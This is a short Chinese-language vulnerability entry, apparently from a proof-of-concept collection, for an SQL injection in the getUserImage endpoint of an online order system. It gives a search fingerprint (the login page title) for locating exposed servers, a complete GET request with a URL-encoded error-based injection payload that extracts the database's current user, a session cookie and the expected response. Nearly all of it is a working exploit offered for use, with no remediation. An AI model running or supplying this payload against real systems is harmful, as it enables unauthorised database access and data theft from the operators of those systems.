# 杜特网上订单系统getUserImageSQL注入漏洞

- **系统**：杜特网上订单系统getUserImage　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="欢迎登陆到网上订单系统"`
- **请求**：`GET /ajax/getUserImage.ashx?locadCode=1%27%20AND%203082=(SELECT%20(CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2BCURRENT_USER%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))--%20wXyW HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=o5boyqc2muvzts3x2atfjm4r`
- **预期**：200　|　—